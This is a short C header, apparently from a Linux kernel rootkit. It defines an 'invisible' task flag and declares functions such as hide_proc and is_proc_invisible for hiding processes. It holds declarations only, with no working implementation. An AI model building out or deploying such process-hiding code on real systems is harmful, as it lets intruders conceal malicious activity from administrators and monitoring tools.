#define FLAG 0x80000000

struct tgid_iter {
	unsigned int tgid;
	struct task_struct *task;
};

static inline int is_task_invisible(struct task_struct *task)
{
	return task->flags & FLAG;
}

int flag_tasks(pid_t pid, int set);
int is_proc_invisible(pid_t pid);
int is_proc_invisible_2(const char __user *filename);
//void hide_proc(char *pid_str);
void hide_proc(pid_t pid);